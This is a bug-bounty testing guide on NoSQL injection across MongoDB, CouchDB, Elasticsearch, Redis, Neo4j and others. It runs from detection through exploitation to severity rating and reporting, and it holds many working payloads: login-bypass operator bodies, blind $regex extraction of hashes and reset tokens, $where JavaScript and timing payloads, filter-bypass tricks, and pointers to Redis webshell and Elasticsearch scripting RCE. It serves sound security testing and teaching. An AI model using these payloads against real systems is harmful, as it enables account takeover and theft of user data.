# NoSQL Injection — Advanced Testing Guide

**Author:** x8bitranjit
**Class:** NoSQL Injection (MongoDB, CouchDB, Elasticsearch, Redis, Cassandra, Neo4j, DynamoDB, Firebase)
**Impact ceiling:** **Authentication bypass** (login with no password) · **full-collection blind data exfiltration** · **server-side JS execution** · **RCE** (Elasticsearch/Redis/Neo4j-apoc) · **SSRF**.
**Primary CWE:** CWE-943 (Improper Neutralization of Special Elements in a Data Query) · downstream CWE-287 (auth bypass), CWE-94 (JS/`$where` code injection).

> ⚠️ **Advanced guide.** Before diving in, get the basics from **PortSwigger Web Security Academy — NoSQL injection**, **HackTricks — NoSQL injection**, **OWASP Testing Guide (Testing for NoSQL Injection)**, **PayloadsAllTheThings/NoSQL Injection**, and the **MongoDB query-operator docs**. This guide assumes you know what a MongoDB operator is — it teaches you how to *weaponize* one and *prove impact*.

---

## Read this first — why NoSQLi still pays

Everyone hardened SQL; far fewer developers know that `db.users.find({user: req.body.user, pass: req.body.pass})` is just as injectable when `req.body.user` is allowed to be **an object** instead of a string. Send `{"$ne": null}` and the query becomes "any user, any password" — **login as the first/admin user with no credentials**. That is why NoSQLi remains a reliable **High/Critical**:

- **Auth bypass with zero credentials** — the single most common and highest-value NoSQLi.
- **Blind extraction** — `$regex` / `$where` leak password hashes, session tokens, and **password-reset tokens** one character at a time → **ATO**.
- **Server-side JavaScript** (`$where`, `mapReduce`, `$function`) — arbitrary JS in the DB engine → blind exfil, DoS, and on some stacks **RCE**.
- Modern JS/PHP body parsers **auto-convert** `user[$ne]=x` (form) or `{"user":{"$ne":"x"}}` (JSON) into the exact nested object the driver injects — the attacker doesn't even need clever syntax, just a type the dev didn't validate.

**Report impact, not the operator.** "`[$ne]` triggers a different response" is a detection signal. "I logged into the admin account with no password" or "I extracted the admin password-reset token and took over the account" is the finding. Always drive to **auth bypass, data you exfiltrated, code you executed, or the account you took over.**

**The core mental model.** SQLi = break out of a *string* with quotes. NoSQLi = smuggle a **query operator or a code fragment** into a place the developer expected a **scalar** (string/number). Two sub-families:
1. **Operator injection** — inject `$ne/$gt/$regex/$in/$where/$or/...` where a string was expected (structured; JSON/BSON).
2. **Syntax/JS injection** — break out of a string that is concatenated into a query or a `$where`/Cypher/CQL/Lua/Painless expression (string context).

---

## Master Testing Sequence

1. **Fingerprint the datastore + stack.** MongoDB? CouchDB? Elasticsearch? Node/PHP/Python driver? (Determines operators and syntax.)
2. **Find every input that reaches a query** — login, search, filters, `id`/lookup, sort/projection, aggregation, JSON API bodies.
3. **Detect** — special-char/error probing → **operator-injection differential** (`[$ne]`, `[$gt]`, `[$regex]`) → boolean → time-based, each control-baselined.
4. **Exploit by type** — auth bypass → filter/data disclosure → **blind char-by-char extraction** → server-side JS → per-datastore RCE/SSRF.
5. **Escalate** to ATO (reset-token exfil), collection dump, RCE, SSRF, or chain into GraphQL resolvers.
6. **Validate → severity → SAFE-PoC → report.**

---

# PART I — Find & fingerprint

## 1.1 Which datastore? (it dictates the payloads)

| Signal | Datastore |
|--------|-----------|
| `MongoError`, `E11000`, `$where`, ObjectId(`24-hex`), ports 27017 | **MongoDB** (most common) |
| `_all_docs`, `_design`, Mango `selector`, `error":"forbidden"`, port 5984 | **CouchDB / Cloudant** |
| `"took":`, `"hits":`, `_search`, `query":{"match"...}`, port 9200 | **Elasticsearch / OpenSearch** |
| `-ERR`, `WRONGTYPE`, RESP, port 6379 | **Redis** |
| CQL errors, `allow filtering`, port 9042 | **Cassandra** |
| `Neo.ClientError`, Cypher, `MATCH (n)`, port 7474/7687 | **Neo4j** |
| `ValidationException`, PartiQL, `firebaseio.com`, `.json` endpoints | **DynamoDB / Firebase** |

Also: the JS framework (Express + Mongoose, PHP + `mongodb`, Python + PyMongo), because the **body parser** decides whether `user[$ne]=` becomes an object. Grep JS/config for `find(`, `findOne(`, `$where`, `aggregate(`, `mongoose`, `elasticsearch`, `redis`.

## 1.2 Where user input reaches a query (contexts)

- **Login** — `findOne({username, password})` → operator-injection auth bypass (flagship).
- **Search / filter** — `find({name: {$regex: q}})`, category/price filters → data disclosure, filter bypass.
- **ID/lookup** — `findOne({_id: id})` → type confusion, `$ne`/`$gt` to enumerate.
- **Sort / projection / limit** — attacker-controlled `sort`/`fields` → info disclosure, DoS.
- **Aggregation pipeline** — user-controlled `$match`/`$group`/`$lookup` stages → cross-collection reads, `$out`/`$merge` writes.
- **`$where` / JS** — any place raw JS strings are built from input.

## 1.3 Injection surface per input format (this is the crux)

The **same logical injection** appears differently depending on how the app parses input:

```
# JSON body (Content-Type: application/json):
{"username": {"$ne": null}, "password": {"$ne": null}}

# URL-encoded / form body with bracket notation (Express qs, PHP) -> parsed to a nested object:
username[$ne]=null&password[$ne]=null
username[$gt]=&password[$gt]=

# Query string, same bracket trick:
GET /api/users?role[$ne]=guest

# Deep-object (qs) for nested operators:
filter[age][$gt]=0
```

**Content-type switching is a key bypass:** an endpoint that validates the JSON body may accept the same payload as `application/x-www-form-urlencoded` with `[$ne]` brackets (or vice-versa) — always try both. See also GraphQL resolver injection in [GraphQL](#/graphql/guide).

---

# PART II — Detection (control-baselined, low false-positive)

Always capture a **control/baseline** response first (valid input, and clearly-invalid input) so "different" is measured, not guessed.

## 2.1 Error / special-character probing

Inject into string params and watch for datastore errors or 500s:

```
'   "   `   \   ;   {   }   {}   ]   [   $   //   
'"`{;$   (combined)
%00
```
A `MongoError`/`SyntaxError`/`E11000`/`unterminated`/`unexpected token` leak confirms the input reaches a query and hints at string-context (`$where`) injection.

## 2.2 Operator-injection differential (the core NoSQLi test)

Compare a **true-forcing** operator against a **false-forcing** one on the same param:

```
# should return "more"/all (always-true):
param[$ne]=<value-that-does-not-exist>       -> matches everything not equal to a bogus value
param[$gt]=                                    -> greater-than empty string ~ everything
param[$regex]=.*                               -> matches anything
param[$exists]=true

# should return "none"/nothing (always-false):
param[$gt]=~~~~~~                               -> greater than a high value
param[$regex]=^$   (with a non-empty field)
param[$in]=[]                                   -> in empty set
```

If `[$ne]`/`[$gt]`/`[$regex]=.*` returns **more rows / a successful login / different length** than the false variants (and than the string baseline), that's **operator injection confirmed**. Test **both** JSON and bracket forms.

## 2.3 Boolean-based

Force the query true vs false and diff the response (status/length/content):

```
username[$eq]=validuser&password[$ne]=x        # TRUE  (valid user, any pass)
username[$eq]=validuser&password[$eq]=wrong    # FALSE
```

## 2.4 Time-based (server-side JS — MongoDB)

When `$where` / JS eval is reachable, prove blind via a delay:

```
username=admin'; while(true){}; //             # DoS-y, avoid on prod — use bounded sleep instead
{"$where": "sleep(3000) || true"}              # bounded 3s delay
{"$where": "function(){ return this.user=='admin' && sleep(3000) }"}
```
A reliable delay only on the true branch = blind boolean via timing. Keep sleeps short; never infinite-loop prod.

---

# PART III — Exploitation by type

## 3.1 Authentication bypass (the flagship)

Target `findOne({username, password})`-style logins. Make one or both fields an operator:

```
# JSON body:
{"username": {"$ne": null},  "password": {"$ne": null}}      # log in as the FIRST matching user
{"username": "admin",         "password": {"$ne": ""}}       # target admin, any password
{"username": {"$gt": ""},     "password": {"$gt": ""}}
{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": 1}}
{"username": "admin", "password": {"$regex": "^"}}           # regex that matches anything

# form / bracket:
username[$ne]=x&password[$ne]=x
username=admin&password[$ne]=x
username[$gt]=&password[$gt]=
```

**If the app returns "the first user":** you often land as whatever is first in the collection (frequently the admin/seed account). To *target* admin, pin `username:"admin"` and inject only the password operator.

**`$where`-based login bypass** (string concatenated into `$where`):
```
username=admin'||'1'=='1
username=admin'||1==1//
password=' || true || '
```

→ **Impact:** authenticated session with **no valid password** → often **admin** → High/Critical.

## 3.2 Filter / search injection → data disclosure

Make a restrictive filter permissive:

```
# "only show MY orders" -> show everyone's:
GET /orders?userId[$ne]=0
GET /products?published[$ne]=false          # reveal unpublished/draft/internal
GET /users?role[$ne]=none&isDeleted[$ne]=true
# $regex to widen a search into a full read:
search[$regex]=.*
```

→ Data disclosure / authz bypass (pairs with [IDOR](#/idor/guide)).

## 3.3 Blind data extraction (char-by-char) — the ATO engine

When you can't see data but can see a **true/false** difference (login success, result count, status), extract secrets with `$regex`:

```
# does the admin password (hash) start with 'a'?  flip until the response says TRUE:
{"username":"admin","password":{"$regex":"^a"}}
{"username":"admin","password":{"$regex":"^ab"}}
...extend one char at a time over the charset [a-f0-9] (hash) or full charset (token).

# length discovery:
{"username":"admin","password":{"$regex":"^.{32}$"}}   # is it exactly 32 chars?

# extract a password-RESET token for ATO (most impactful):
GET /reset?email=victim@x&token[$regex]=^a ...          # confirm each char, then use the full token
```

`$where` JS extraction (when regex is filtered):
```
{"$where":"this.password[0]=='a'"}
{"$where":"this.secret.match(/^a/)!=null"}
```

Automate with `poc/nosqli_blind.py` (boolean `$regex` + time-based `$where`, binary-search over the charset). → **Full credential/token exfil → ATO.**

## 3.4 Server-side JavaScript injection (MongoDB)

If `$where`, `mapReduce`, `$accumulator`, or `$function` (MongoDB ≥4.4) accept attacker JS, or legacy `eval` is enabled:

```
{"$where": "return true"}                                  # confirm JS runs
{"$where": "this.password.length>20"}                      # blind predicate
{"$where": "sleep(5000)"}                                  # time oracle / DoS
{"$where": "Object.keys(this)"}                            # field discovery
# mapReduce / $function with a JS body -> full JS engine (data exfil via timing/booleans; DoS)
```

Modern MongoDB sandboxes JS (no shell/network), so `$where` is usually **blind exfil + DoS**, not OS RCE — but it dumps *any* field and enables timing oracles. Old MongoDB + `eval`, or JS piped into a Node `vm`/`eval` sink, can reach **RCE** (verify carefully).

## 3.5 Per-datastore specifics

- **MongoDB** — everything above; also **aggregation injection** (`$lookup` to read other collections, `$out`/`$merge` to **write**), `$expr`, `$jsonSchema`.
- **CouchDB** — Mango `selector` operators (`{"selector":{"_id":{"$gt":null}}}` dumps all docs); `_all_docs`, `_users`; **CVE-2017-12635** (JSON duplicate-key parser differential in the Erlang vs JS validator → create an **admin** user → privesc/RCE via `_config` + query server).
- **Elasticsearch / OpenSearch** — query-DSL injection into `_search`; **scripting RCE**: Groovy **CVE-2014-3120**, MVEL **CVE-2015-1427** (`{"script":"..."}` → OS command); `_search` blind boolean; unauth clusters dump `_all`.
- **Redis** — **CRLF/command injection** (smuggle `\r\n` into a value that's written into the RESP protocol) → run arbitrary Redis commands; `EVAL` **Lua** injection; `MODULE LOAD` / `CONFIG SET dir`+`SAVE` webshell → **RCE**. Often reached via SSRF ([SSRF](#/ssrf/guide)).
- **Cassandra (CQL)** — `' OR '1'='1`, `ALLOW FILTERING`; more limited (prepared-statement heavy) but string-concat endpoints inject.
- **Neo4j (Cypher)** — `' OR 1=1 //`, `' RETURN ...`, `UNION`, **`LOAD CSV FROM 'http://...'`** (SSRF/file read), **`apoc.*`** procedures → file/SSRF/**RCE** (`apoc.systemdb`, `dbms.security`), label/property enumeration.
- **DynamoDB** — **PartiQL** injection (`' OR '1'='1`) in `ExecuteStatement`.
- **Firebase / Firestore** — insecure security rules → unauth read/write; REST `.json` endpoints (`https://db.firebaseio.com/users.json`) readable; append/patch via PUT/PATCH.

## 3.6 Aggregation-pipeline & write injection

User-controlled pipeline stages are the "second-order" of NoSQLi:
```
$match  -> filter bypass / data disclosure
$lookup -> join & read a collection you shouldn't ($lookup: {from:"users",...})
$out / $merge -> WRITE results into a collection (integrity impact / stored payload)
$function / $accumulator -> server-side JS
```

---

# PART IV — WAF / filter bypass & advanced

**`$` / `.` key sanitization bypass** (apps that strip/replace `$` or `.` in keys):
```
# nested so the top-level key isn't literally "$ne":
{"username": {"$not": {"$eq": null}}}
# unicode / homoglyph / alternate encodings of $ (test what the sanitizer misses)
# double keys / prototype tricks depending on parser
# send operator in a place the sanitizer doesn't walk (arrays, deep nesting)
```

**Format switching:** JSON ↔ `application/x-www-form-urlencoded` (`[$ne]`) ↔ multipart ↔ query string. A filter on one content-type rarely covers all. Combine with **HTTP Parameter Pollution**.

**Type juggling / BSON:** number vs string vs bool vs null (`password=0` vs `password="0"`); arrays where scalars expected (`username[]=admin` → `$in`-like behavior in some parsers).

**Second-order:** injected operator stored (profile field, saved search) and later used unsanitized in a query.

**Sanitizer-specific:** `mongo-sanitize` / `express-mongo-sanitize` strip keys starting with `$` or containing `.` — bypass via nested operators the middleware doesn't recurse into, or keys reconstructed downstream.

---

# PART V — Escalate to impact ("you found X → do Y")

| You found | Do this | Severity |
|-----------|---------|----------|
| `[$ne]` changes login response | Auth-bypass: `{"username":{"$ne":null},"password":{"$ne":null}}` → land as first/admin user | Critical/High |
| Auth bypass lands as non-admin | Pin `username:"admin"` + password operator; or extract admin creds via blind regex | Critical |
| Boolean/true-false diff on a param | Blind `$regex` char-by-char → dump password hash / **reset token** → ATO | Critical |
| `$where`/JS runs | Blind predicate exfil of any field; timing oracle; check for eval→RCE | High/Critical |
| Filter param injectable | `[$ne]` to reveal other users'/unpublished data (→ [IDOR](#/idor/guide)) | High/Medium |
| Elasticsearch `_search`/script | Script RCE (CVE-2014-3120/2015-1427) or `_all` dump | Critical |
| Redis reachable + CRLF | Command injection → `CONFIG SET`+`SAVE` webshell / `MODULE LOAD` → RCE | Critical |
| Neo4j Cypher | `LOAD CSV`/`apoc` → SSRF/file/RCE | Critical/High |
| CouchDB | CVE-2017-12635 → create admin → privesc | Critical |
| Aggregation `$lookup`/`$out` | Cross-collection read / write | High |

**Chains:** [IDOR](#/idor/guide) (authz), [SSRF](#/ssrf/guide) (reach internal Redis/ES/Mongo), [GraphQL](#/graphql/guide) & [REST](#/rest/guide) (resolver/endpoint injection), [JWT](#/jwt/guide) (exfiltrated secret → forge tokens), password-reset flow (token exfil → ATO).

---

# PART VI — Validity, false positives, severity, reporting

## 6.1 False-positive auto-reject table

| Observation | Why it's NOT (yet) a finding | What makes it real |
|-------------|------------------------------|--------------------|
| `[$ne]` returns a 500 error | Could be generic type error, not injection | A **query-behavior change** you can steer (more/fewer results, login success) |
| `'`/`{` triggers an error | Error ≠ exploitable injection | A boolean/operator payload that **changes results** or logs you in |
| Login "works" with `[$ne]` once | Might be a valid cached session / your own creds | Reproduce in a **fresh** session with **no** valid password; confirm you're a **different** user |
| `$regex=.*` returns everything | Maybe the endpoint returns all by default | Diff against the **false** variant (`$gt:~~~`) — only a real **difference** counts |
| Timing delay once | Network jitter | **Repeatable**, threshold-crossing delay only on the true/`sleep` branch |
| Reflected `$ne` in JSON echo | Reflection ≠ execution | The operator **affects the query result** |
| App is "MongoDB" | Tech ≠ vuln | A parameter that actually injects |

**Golden rule:** a NoSQLi finding requires a **controlled, repeatable change in query behavior** — you logged in without a password, you retrieved data you shouldn't, you extracted a secret, or you executed JS. A lone error or a single odd response is a *lead*, not a bug.

## 6.2 Severity calibration (CVSS + CWE)

| Scenario | Severity | CWE |
|----------|----------|-----|
| Auth bypass → admin, no credentials | **Critical (9–10)** | CWE-943 → CWE-287 |
| Blind extraction of hashes/reset-tokens → ATO | **Critical/High** | CWE-943 |
| Elasticsearch/Redis/Neo4j → RCE | **Critical** | CWE-943 → CWE-94/78 |
| Data disclosure of other users' records | **High** | CWE-943 |
| Filter/authz bypass (limited data) | **Medium/High** | CWE-943 |
| `$where` DoS (bounded) | **Medium** | CWE-943 → CWE-400 |
| Operator differential with no exploited impact | **Low/Info** | CWE-943 |

## 6.3 SAFE-PoC discipline

- Use **your own test account** as the "victim" for extraction/ATO demos; don't dump real users' data.
- **Auth bypass:** log into a **test** account (or your own admin in a lab); for a real target, prove access to the account page/`whoami`, capture one screenshot, **don't** pivot into real user data.
- **Blind extraction:** extract **your own** secret (or a benign marker field) to prove the primitive; stop after enough characters to demonstrate — don't exfil every user's hash.
- **`$where`/time:** use a **bounded** `sleep` (≤5s), never an infinite loop or heavy `mapReduce` on prod (DoS).
- **RCE (ES/Redis/Neo4j):** one benign command (`id`/OOB callback) then STOP; no shells/persistence; tear down listeners.
- **Writes (`$out`/`$merge`, Firebase, Redis `SET`):** avoid modifying prod data; if you must prove write, use a throwaway key you create and delete.
- Throttle blind loops; don't hammer prod. Redact extracted secrets in the report.

## 6.4 Reporting

Lead with impact + a minimal reproduction: the exact request (both JSON and bracket forms if relevant), the control vs injected responses, and the resulting session/data. Use the report template. Name the sink pattern (`findOne({user,pass})` with unvalidated object input) and the fix (type-check inputs to strings; use `$eq`/parameterization; strip operator keys with a recursive sanitizer; disable server-side JS).

## 6.5 Real-world references / CVEs

- **PortSwigger Academy** — NoSQL injection labs (operator + `$where`).
- **CVE-2017-12635 / -12636** (Apache CouchDB) — JSON parser differential → admin creation → RCE.
- **CVE-2014-3120 / CVE-2015-1427** (Elasticsearch) — Groovy/MVEL dynamic-scripting RCE.
- MongoDB `$where` / `mapReduce` server-side JS advisories; countless HackerOne MongoDB **login-bypass** and **blind-regex token-exfil** reports.
- **Neo4j** `apoc`/`LOAD CSV` SSRF-RCE research; **Redis** unauth `CONFIG SET`+`SAVE` webshell technique.
- PayloadsAllTheThings / NoSQLMap documentation for the payload corpus.

---

## Companion files
- **[Attack Arsenal](#/nosqli/arsenal)** — payloads + tool commands.
- **[Testing Checklist](#/nosqli/checklist)** — phase-by-phase + auto-reject.
- **the report template** — report skeleton.
- **[Zero to Expert (Q&A)](#/nosqli/qa)** — 100-question study + field reference.
- **[PoC Scripts](#/nosqli/poc)** — `nosqli_fuzz.py` (detect + auth-bypass, control-baselined) · `nosqli_blind.py` (regex/time char-by-char) · `nosqlmap_cheat.md`.
